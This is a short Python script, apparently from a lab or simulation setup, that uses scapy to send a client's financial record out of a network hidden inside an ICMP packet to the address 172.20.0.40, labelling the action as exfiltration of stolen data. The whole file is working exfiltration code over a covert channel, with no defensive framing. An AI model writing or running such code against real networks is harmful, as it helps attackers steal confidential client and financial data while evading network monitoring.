#!/usr/bin/env python3
from scapy.all import *

# Send stolen data via ICMP
data = "CLIENT:1001|Goldman Investments LLC|$2500000.00"
packet = IP(dst="172.20.0.40")/ICMP()/data
send(packet)
print(f"[EXFIL] Sent: {data}")
